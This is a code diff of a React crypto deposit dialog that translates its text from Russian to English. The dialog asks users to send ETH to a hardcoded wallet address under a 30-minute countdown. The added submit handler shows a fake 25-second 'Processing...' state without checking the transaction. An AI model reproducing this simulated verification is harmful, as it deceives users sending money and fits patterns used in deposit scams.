@@ -3,6 +3,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } f
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { CountdownTimer } from "@/components/CountdownTimer";
+import { Loader2 } from "lucide-react";
 
 interface DepositConfirmationDialogProps {
   isOpen: boolean;
@@ -18,23 +19,32 @@ const DepositConfirmationDialog = ({
   onConfirm
 }: DepositConfirmationDialogProps) => {
   const [transactionHash, setTransactionHash] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";
   
   // Calculate end time (30 minutes from now)
   const endTime = new Date(new Date().getTime() + 30 * 60000).toISOString();
 
+  const handleSubmit = async () => {
+    setIsSubmitting(true);
+    // Simulate loading for 25 seconds
+    await new Promise(resolve => setTimeout(resolve, 25000));
+    setIsSubmitting(false);
+    onConfirm(transactionHash);
+  };
+
   return (
     <Dialog open={isOpen} onOpenChange={onClose}>
       <DialogContent className="sm:max-w-md">
         <DialogHeader>
-          <DialogTitle>Подтверждение депозита</DialogTitle>
+          <DialogTitle>Deposit Confirmation</DialogTitle>
           <DialogDescription className="space-y-4">
             <div className="mt-4">
               <CountdownTimer endTime={endTime} />
             </div>
             
             <div className="space-y-2 mt-4">
-              <p>Пожалуйста, отправьте {amount} ETH на следующий адрес:</p>
+              <p>Please send {amount} ETH to the following address:</p>
               <div className="bg-muted p-2 rounded-md break-all font-mono">
                 {walletAddress} (ERC-20)
               </div>
@@ -42,22 +52,29 @@ const DepositConfirmationDialog = ({
 
             <div className="space-y-2">
               <label className="text-sm font-medium">
-                Hash транзакции
+                Transaction Hash
               </label>
               <Input
                 value={transactionHash}
                 onChange={(e) => setTransactionHash(e.target.value)}
-                placeholder="Введите hash транзакции"
+                placeholder="Enter transaction hash"
                 className="font-mono"
               />
             </div>
 
             <Button 
               className="w-full" 
-              onClick={() => onConfirm(transactionHash)}
-              disabled={!transactionHash}
+              onClick={handleSubmit}
+              disabled={!transactionHash || isSubmitting}
             >
-              Подтверждение
+              {isSubmitting ? (
+                <>
+                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                  Processing...
+                </>
+              ) : (
+                'Confirm'
+              )}
             </Button>
           </DialogDescription>
         </DialogHeader>
